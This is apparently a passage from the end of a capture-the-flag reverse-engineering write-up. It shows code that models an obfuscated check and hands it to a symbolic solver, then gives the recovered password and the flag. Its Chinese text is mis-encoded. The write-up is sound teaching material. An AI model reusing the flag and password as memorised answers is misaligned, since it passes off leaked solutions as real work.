    v4 = a3 + ((a4 ^ 0x249410C214101D0) & 0x3DFC12C3F4F5BF2 | 1)
    a3=a4
    a4=v4
a4 = ((0x4D58793A9FB2D441 * a3) ^ 0x5AD787B42BE74394 |\
      (a3 | 0x4D58793A9FB2D441) ^ 0x7D79797BFFBBDED5\
      | (0x51638AD3ECD0AD11 * a4) ^ 0xAF768CBDFBD7AA06\
      | (a4 | 0x51638AD3ECD0AD11) ^ 0x796FBBDFFFF4EDB7)
state.solver.add(a4==0)
state.solver.eval(a3)
state.solver.eval(a4)
```
å¾—åˆ°å¯†ç ä¸ºDAjhpGQffnr2z1Vgã€‚  
flag{ESREVER_3c834b54f2f4ade2}